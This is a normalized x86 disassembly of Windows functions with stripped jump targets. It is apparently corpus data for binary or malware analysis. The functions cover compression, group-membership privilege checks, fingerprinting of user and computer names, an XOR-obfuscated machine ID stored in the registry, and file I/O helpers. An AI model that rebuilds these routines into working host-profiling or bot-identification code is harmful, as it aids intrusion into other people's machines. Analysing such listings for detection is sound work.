retn
movzx eax [ ebp - 0x1 ]
and eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x18 ] 0x1
mov eax [ ebp - 0x20 ]
mov al [ eax ]
mov [ ebp - 0x1 ] al
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x20 ]
mov cl [ ecx ]
mov [ eax ] cl
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x20 ]
movzx eax [ eax ]
sar eax 0x2
add eax 0x3
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
movzx eax [ eax ]
shl eax 0x8
mov ecx [ ebp - 0x20 ]
movzx ecx [ ecx + 0x1 ]
or eax ecx
and eax 0x3ff
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x20 ]
inc eax
inc eax
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cmp eax [ ebp + 0xc ]
jae r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
mov eax [ ebp - 0x28 ]
dec eax
mov [ ebp - 0x28 ] eax
js r-xdata
or eax 0xffffffff
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x1c ]
mov cl [ ecx ]
mov [ eax ] cl
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x1c ]
inc eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x14 ]
inc eax
mov [ ebp - 0x14 ] eax
jmp r-xdata
sub_410f11
push ebp
mov ebp esp
sub esp 0x824
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x820 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x810 ] 0x80
and [ ebp - 0x808 ] 0x0
push 0x7fe
push 0x0
lea eax [ ebp - 0x806 ]
push eax
call sub_4031e0
add esp 0xc
mov eax [ ebp - 0x8 ]
sub eax [ ebp + 0xc ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
mov eax [ ebp - 0x810 ]
shl eax 0x1
mov [ ebp - 0x810 ] eax
cmp [ ebp - 0x810 ] 0x100
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax - 0x42 ]
cmp [ ebp - 0x820 ] eax
jbe r-xdata
mov eax [ ebp + 0x14 ]
mov eax [ eax ]
mov ecx [ ebp + 0xc ]
lea eax [ ecx + eax - 0x11 ]
cmp [ ebp - 0x8 ] eax
jb r-xdata
mov eax [ ebp - 0x820 ]
movzx eax [ eax ]
shl eax 0x10
mov ecx [ ebp - 0x820 ]
movzx ecx [ ecx + 0x1 ]
shl ecx 0x8
add eax ecx
mov ecx [ ebp - 0x820 ]
movzx ecx [ ecx + 0x2 ]
add eax ecx
mov [ ebp - 0x818 ] eax
mov eax [ ebp - 0x818 ]
shr eax 0x9
add eax [ ebp - 0x818 ]
mov [ ebp - 0x818 ] eax
mov eax [ ebp - 0x818 ]
shr eax 0x5
add eax [ ebp - 0x818 ]
mov [ ebp - 0x818 ] eax
mov eax [ ebp - 0x818 ]
and eax 0x3ff
lea eax [ ebp + eax * 2 - 0x808 ]
mov [ ebp - 0x814 ] eax
mov eax [ ebp - 0x814 ]
movzx eax [ eax ]
mov ecx [ ebp - 0x820 ]
sub ecx eax
and ecx 0x3ff
mov [ ebp - 0x80c ] ecx
mov eax [ ebp - 0x814 ]
mov cx [ ebp - 0x820 ]
mov [ eax ] cx
mov eax [ ebp - 0x820 ]
sub eax [ ebp - 0x80c ]
mov [ ebp - 0x81c ] eax
mov eax [ ebp - 0x81c ]
cmp eax [ ebp + 0x8 ]
jb r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x820 ]
mov cl [ ecx ]
mov [ eax ] cl
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x820 ]
inc eax
mov [ ebp - 0x820 ] eax
jmp r-xdata
mov [ ebp - 0x810 ] 0x1
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x820 ]
mov cl [ ecx ]
mov [ eax ] cl
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x820 ]
inc eax
mov [ ebp - 0x820 ] eax
mov eax [ ebp - 0x81c ]
cmp eax [ ebp - 0x820 ]
je r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp + 0x10 ]
cmp [ ebp - 0x820 ] eax
jae r-xdata
leave
retn
mov eax [ ebp - 0x820 ]
movzx eax [ eax ]
mov ecx [ ebp - 0x81c ]
movzx ecx [ ecx ]
cmp eax ecx
jne r-xdata
mov eax [ ebp - 0x820 ]
movzx eax [ eax + 0x1 ]
mov ecx [ ebp - 0x81c ]
movzx ecx [ ecx + 0x1 ]
cmp eax ecx
jne r-xdata
mov eax [ ebp - 0x820 ]
movzx eax [ eax + 0x2 ]
mov ecx [ ebp - 0x81c ]
movzx ecx [ ecx + 0x2 ]
cmp eax ecx
jne r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
or eax [ ebp - 0x810 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] al
mov [ ebp - 0x824 ] 0x3
jmp r-xdata
cmp [ ebp - 0x824 ] 0x42
jae r-xdata
mov eax [ ebp - 0x824 ]
lea eax [ eax * 4 - 0xc ]
mov ecx [ ebp - 0x80c ]
shr ecx 0x8
or eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] al
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov cl [ ebp - 0x80c ]
mov [ eax ] cl
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x820 ]
add eax [ ebp - 0x824 ]
mov [ ebp - 0x820 ] eax
jmp r-xdata
mov eax [ ebp - 0x820 ]
add eax [ ebp - 0x824 ]
movzx eax [ eax ]
mov ecx [ ebp - 0x81c ]
add ecx [ ebp - 0x824 ]
movzx ecx [ ecx ]
cmp eax ecx
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x824 ]
inc eax
mov [ ebp - 0x824 ] eax
sub_4111e7
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
add eax 0x24
push eax
call [ lstrcmpiW@IAT ]
test eax eax
jne r-xdata
xor al al
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov [ eax ] ecx
mov al 0x1
jmp r-xdata
leave
retn
sub_41121b
push ebp
mov ebp esp
mov eax 0x204c
call sub_40a0e0
mov [ ebp - 0x204c ] ecx
and [ ebp - 0x14 ] 0x0
and [ ebp - 0x10 ] 0x0
mov [ ebp - 0x2048 ] 0x0
mov [ ebp - 0x2047 ] 0x0
mov [ ebp - 0x2046 ] 0x0
mov [ ebp - 0x2045 ] 0x0
mov [ ebp - 0x2044 ] 0x0
mov [ ebp - 0x2043 ] 0x5
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x202c ] 0x0
and [ ebp - 0x18 ] 0x0
lea eax [ ebp - 0x2020 ]
mov [ ebp - 0x8 ] eax
and [ ebp - 0x2038 ] 0x0
mov [ ebp - 0x2034 ] 0x104
mov [ ebp - 0x2028 ] 0x100
and [ ebp - 0x2030 ] 0x0
mov eax [ ebp - 0x2030 ]
mov [ ebp - 0x2024 ] eax
mov eax [ ebp - 0x2024 ]
mov [ ebp - 0x203c ] eax
mov eax [ ebp - 0x203c ]
mov [ ebp - 0x2040 ] eax
mov eax [ ebp - 0x2040 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x204c ]
cmp [ eax + 0x58bc ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x204c ]
mov eax [ eax + 0x58bc ]
leave
retn
push 0x200
push rw-data
call sub_40103d
pop ecx
pop ecx
mov eax [ ebp - 0x204c ]
and [ eax + 0x58bc ] 0x0
mov [ ebp - 0x10 ] 0x100
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call [ GetUserNameW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x220
push 0x20
push 0x2
lea eax [ ebp - 0x2048 ]
push eax
call [ AllocateAndInitializeSid@IAT ]
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x223
push 0x20
push 0x2
lea eax [ ebp - 0x2048 ]
push eax
call [ AllocateAndInitializeSid@IAT ]
lea eax [ ebp - 0x2040 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x222
push 0x20
push 0x2
lea eax [ ebp - 0x2048 ]
push eax
call [ AllocateAndInitializeSid@IAT ]
lea eax [ ebp - 0x203c ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x12
push 0x1
lea eax [ ebp - 0x2048 ]
push eax
call [ AllocateAndInitializeSid@IAT ]
lea eax [ ebp - 0x2024 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x13
push 0x1
lea eax [ ebp - 0x2048 ]
push eax
call [ AllocateAndInitializeSid@IAT ]
lea eax [ ebp - 0x2030 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x14
push 0x1
lea eax [ ebp - 0x2048 ]
push eax
call [ AllocateAndInitializeSid@IAT ]
mov eax [ ebp - 0x204c ]
mov [ eax + 0x58bc ] 0x14
cmp [ ebp - 0xc ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x5
push 0xffffffff
push 0x0
call WTSQuerySessionInformationW
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0xc ]
push 0x0
call [ CheckTokenMembership@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push rw-data
call sub_402b50
add esp 0xc
push [ ebp - 0x14 ]
call WTSFreeMemory
cmp [ ebp - 0x2040 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x20 ]
push 0x0
call [ CheckTokenMembership@IAT ]
test eax eax
je r-xdata
push [ ebp - 0xc ]
call [ FreeSid@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x203c ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x2040 ]
push 0x0
call [ CheckTokenMembership@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x20 ]
call [ FreeSid@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x204c ]
mov [ eax + 0x58bc ] 0x28
cmp [ ebp - 0x2024 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x203c ]
push 0x0
call [ CheckTokenMembership@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x2040 ]
call [ FreeSid@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x204c ]
mov [ eax + 0x58bc ] 0x1e
cmp [ ebp - 0x2030 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x2024 ]
push 0x0
call [ CheckTokenMembership@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x203c ]
call [ FreeSid@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x204c ]
mov [ eax + 0x58bc ] 0xa
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x2030 ]
push 0x0
call [ CheckTokenMembership@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x2024 ]
call [ FreeSid@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x204c ]
mov [ eax + 0x58bc ] 0x32
push [ ebp - 0x2030 ]
call [ FreeSid@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x204c ]
mov [ eax + 0x58bc ] 0x34
mov eax [ ebp - 0x204c ]
mov [ eax + 0x58bc ] 0x36
sub_4115c3
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_41121b
movzx eax [ rw-data ]
test eax eax
je r-xdata
mov eax r--data
mov eax rw-data
jmp r-xdata
leave
retn
sub_4115ed
push ebp
mov ebp esp
sub esp 0x120
mov [ ebp - 0x120 ] ecx
mov [ ebp - 0x4 ] 0x80
mov edx [ ebp - 0x120 ]
add edx 0x5730
mov ecx [ ebp - 0x120 ]
call sub_410cc8
movzx eax al
test eax eax
je r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
leave
retn
mov eax [ rw-data ]
or eax [ rw-data ]
jne r-xdata
mov edx [ ebp - 0x120 ]
add edx 0x5730
mov ecx [ ebp - 0x120 ]
call sub_410c93
push 0x100
lea eax [ ebp - 0x108 ]
push eax
call sub_40103d
pop ecx
pop ecx
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
push 0x6
call GetComputerObjectNameW
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x11c ]
push eax
push r--data
push r--data
mov edx 0x80000001
mov ecx [ ebp - 0x120 ]
call sub_41017c
movzx eax al
test eax eax
je r-xdata
lea eax [ ebp - 0x11c ]
push eax
lea eax [ ebp - 0x108 ]
push eax
call [ IIDFromString@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x11c ]
push eax
call [ UuidCreate@IAT ]
or edx 0xffffffff
mov ecx [ ebp - 0x120 ]
call sub_413729
movzx eax ax
xor eax [ ebp - 0x11c ]
mov [ ebp - 0x11c ] eax
mov edx 0xffff
mov ecx [ ebp - 0x120 ]
call sub_413729
or eax [ ebp - 0x11c ]
movzx ecx [ ebp - 0x118 ]
xor ecx eax
mov [ ebp - 0x118 ] cx
movzx eax [ ebp - 0x116 ]
xor eax 0x1234
mov [ ebp - 0x116 ] ax
mov edx 0xff
mov ecx [ ebp - 0x120 ]
call sub_413729
movzx ecx [ ebp - 0x114 ]
xor ecx eax
mov [ ebp - 0x114 ] cl
mov edx 0xff
mov ecx [ ebp - 0x120 ]
call sub_413729
add eax 0x64
movzx ecx [ ebp - 0x113 ]
xor ecx eax
mov [ ebp - 0x113 ] cl
mov edx 0xff
mov ecx [ ebp - 0x120 ]
call sub_413729
sub eax 0x11
movzx ecx [ ebp - 0x112 ]
xor ecx eax
mov [ ebp - 0x112 ] cl
mov edx 0xff
mov ecx [ ebp - 0x120 ]
call sub_413729
imul eax eax 0x22
movzx ecx [ ebp - 0x111 ]
xor ecx eax
mov [ ebp - 0x111 ] cl
mov edx 0xff
mov ecx [ ebp - 0x120 ]
call sub_413729
add eax 0x1d
movzx ecx [ ebp - 0x110 ]
xor ecx eax
mov [ ebp - 0x110 ] cl
mov edx 0xff
mov ecx [ ebp - 0x120 ]
call sub_413729
sub eax 0x61
movzx ecx [ ebp - 0x10f ]
xor ecx eax
mov [ ebp - 0x10f ] cl
mov edx 0xff
mov ecx [ ebp - 0x120 ]
call sub_413729
imul eax eax 0x15
movzx ecx [ ebp - 0x10e ]
xor ecx eax
mov [ ebp - 0x10e ] cl
mov edx 0xff
mov ecx [ ebp - 0x120 ]
call sub_413729
add eax 0xb
movzx ecx [ ebp - 0x10d ]
xor ecx eax
mov [ ebp - 0x10d ] cl
push 0x4
lea eax [ ebp - 0x10c ]
push eax
lea eax [ ebp - 0x11c ]
push eax
call sub_402b50
add esp 0xc
mov eax [ ebp - 0x11c ]
mov [ rw-data ] eax
mov eax [ ebp - 0x118 ]
mov [ rw-data ] eax
push 0x10
lea edx [ ebp - 0x11c ]
mov ecx [ ebp - 0x120 ]
call sub_4158b4
xor ecx ecx
xor eax [ rw-data ]
xor ecx [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ ebp - 0x8 ] 0x10
push [ ebp - 0x8 ]
lea eax [ ebp - 0x11c ]
push eax
push 0x3
push r--data
push r--data
mov edx 0x80000001
mov ecx [ ebp - 0x120 ]
call sub_4100e9
mov eax [ ebp - 0x11c ]
mov [ rw-data ] eax
mov eax [ ebp - 0x118 ]
mov [ rw-data ] eax
push 0x10
lea edx [ ebp - 0x11c ]
mov ecx [ ebp - 0x120 ]
call sub_4158b4
xor ecx ecx
xor eax [ rw-data ]
xor ecx [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] ecx
jmp r-xdata
mov eax [ ebp - 0x108 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x104 ]
mov [ rw-data ] eax
push 0x100
lea edx [ ebp - 0x108 ]
mov ecx [ ebp - 0x120 ]
call sub_4158b4
xor ecx ecx
xor eax [ rw-data ]
xor ecx [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] ecx
push 0x4
lea eax [ ebp - 0x10c ]
push eax
lea eax [ ebp - 0x11c ]
push eax
call sub_402b50
add esp 0xc
mov eax [ ebp - 0x11c ]
mov [ rw-data ] eax
mov eax [ ebp - 0x118 ]
mov [ rw-data ] eax
push 0x10
lea edx [ ebp - 0x11c ]
mov ecx [ ebp - 0x120 ]
call sub_4158b4
xor ecx ecx
xor eax [ rw-data ]
xor ecx [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] ecx
jmp r-xdata
jmp r-xdata
sub_4119b9
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
leave
retn 0x8
mov eax [ ebp - 0x4 ]
xor eax eax
jmp r-xdata
sub_411a01
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
leave
retn 0x8
mov eax [ ebp - 0x4 ]
xor eax eax
jmp r-xdata
sub_411a49
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x10 ] 0x1
je r-xdata
push [ ebp - 0x4 ]
push 0x0
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x10 ] 0x2
je r-xdata
mov al 0x1
xor al al
jmp r-xdata
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
leave
retn 0x8
sub_411abb
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] ecx
or [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x4 ] 0x80
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x10 ] 0x80000000
mov [ ebp - 0x8 ] 0x3
jmp r-xdata
cmp [ ebp - 0x1c ] 0x1
je r-xdata
leave
retn 0x4
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push 0x0
push 0x1
push [ ebp - 0x10 ]
push [ ebp - 0x18 ]
call [ CreateFileW@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
or eax 0x80000000
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x1c ] 0x2
je r-xdata
cmp [ ebp + 0x8 ] 0x6
jne r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x10 ] 0xc0000000
mov [ ebp - 0x8 ] 0x4
jmp r-xdata
cmp [ ebp - 0x1c ] 0x3
je r-xdata
mov eax [ ebp - 0xc ]
push 0x2
push 0x0
push 0x0
push [ ebp - 0xc ]
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
or eax 0x80000000
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x1c ] 0x4
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x10 ] 0x40000000
mov [ ebp - 0x8 ] 0x2
jmp r-xdata
cmp [ ebp - 0x1c ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
or eax 0x80000000
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x1c ] 0x6
je r-xdata
mov [ ebp - 0x10 ] 0xc0000000
mov [ ebp - 0x8 ] 0x4
jmp r-xdata
jmp r-xdata
sub_411bcd
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push 0x0
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
call sub_411abb
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor al al
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
call sub_411aa5
mov al 0x1
xor al al
jmp r-xdata
leave
retn
sub_411c0c
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
leave
retn 0x4
push 0x0
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
call sub_411abb
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call [ GetFileSizeEx@IAT ]
test eax eax
jne r-xdata
xor al al
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
call sub_411aa5
mov al 0x1
xor al al
jmp r-xdata
sub_411c67
push ebp
mov ebp esp
sub esp 0x218
mov [ ebp - 0x218 ] edx
mov [ ebp - 0x214 ] ecx
and [ ebp - 0x210 ] 0x0
push 0x206
push 0x0
lea eax [ ebp - 0x20e ]
push eax
call sub_4031e0
add esp 0xc
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
push 0x0
push 0x104
lea edx [ ebp - 0x210 ]
mov ecx [ ebp - 0x214 ]
call sub_415b6c
movzx eax al
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
push r--data
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcpyW@IAT ]
cmp [ ebp - 0x4 ] 0x104
jae r-xdata
leave
retn
push [ ebp - 0x218 ]
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcatW@IAT ]
push 0x0
lea edx [ ebp - 0x210 ]
mov ecx [ ebp - 0x214 ]
call sub_413434
push r--data
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcatW@IAT ]
jmp r-xdata
lea eax [ ebp - 0x210 ]
push eax
call [ lstrlenW@IAT ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ ebp + eax * 2 - 0x212 ]
cmp eax 0x5c
je r-xdata
sub_411d45
push ebp
mov ebp esp
sub esp 0x218
mov [ ebp - 0x218 ] edx
mov [ ebp - 0x214 ] ecx
and [ ebp - 0x210 ] 0x0
push 0x206
push 0x0
lea eax [ ebp - 0x20e ]
push eax
call sub_4031e0
add esp 0xc
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x214 ]
call sub_415c32
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcpyW@IAT ]
lea eax [ ebp - 0x210 ]
push eax
call [ lstrlenW@IAT ]
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1
jbe r-xdata
mov eax [ ebp - 0x4 ]
dec eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x1
ja r-xdata
leave
retn
and [ ebp - 0x210 ] 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ ebp + eax * 2 - 0x212 ]
cmp eax 0x5c
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
push r--data
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcatW@IAT ]
mov eax [ ebp - 0x4 ]
movzx eax [ ebp + eax * 2 - 0x212 ]
cmp eax 0x5c
je r-xdata
push [ ebp - 0x218 ]
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcatW@IAT ]
push 0x0
lea edx [ ebp - 0x210 ]
mov ecx [ ebp - 0x214 ]
call sub_413434
sub_411e2c
push ebp
mov ebp esp
sub esp 0x218
mov [ ebp - 0x218 ] edx
mov [ ebp - 0x214 ] ecx
and [ ebp - 0x210 ] 0x0
push 0x206
push 0x0
lea eax [ ebp - 0x20e ]
push eax
call sub_4031e0
add esp 0xc
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
lea eax [ ebp - 0x210 ]
push eax
push 0x0
push 0x0
push 0x1c
push 0x0
call [ SHGetFolderPathW@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcpyW@IAT ]
jmp r-xdata
leave
retn
push [ ebp - 0x218 ]
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcatW@IAT ]
push 0x0
lea edx [ ebp - 0x210 ]
mov ecx [ ebp - 0x214 ]
call sub_413434
push r--data
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x210 ]
push eax
call [ lstrlenW@IAT ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ ebp + eax * 2 - 0x212 ]
cmp eax 0x5c
je r-xdata
sub_411ef6
push ebp
mov ebp esp
sub esp 0x218
mov [ ebp - 0x218 ] edx
mov [ ebp - 0x214 ] ecx
and [ ebp - 0x210 ] 0x0
push 0x206
push 0x0
lea eax [ ebp - 0x20e ]
push eax
call sub_4031e0
add esp 0xc
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x214 ]
call sub_4131f4
movzx eax al
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push 0x104
lea eax [ ebp - 0x210 ]
push eax
call [ GetSystemDirectoryW@IAT ]
mov [ ebp - 0x4 ] eax
push 0x104
lea eax [ ebp - 0x210 ]
push eax
call [ GetSystemWow64DirectoryW@IAT ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
leave
retn
push r--data
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcpyW@IAT ]
cmp [ ebp - 0x4 ] 0x104
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x218 ]
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcatW@IAT ]
push 0x0
lea edx [ ebp - 0x210 ]
mov ecx [ ebp - 0x214 ]
call sub_413434
push r--data
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcatW@IAT ]
jmp r-xdata
lea eax [ ebp - 0x210 ]
push eax
call [ lstrlenW@IAT ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ ebp + eax * 2 - 0x212 ]
cmp eax 0x5c
je r-xdata
sub_411ff4
push ebp
mov ebp esp
sub esp 0x294
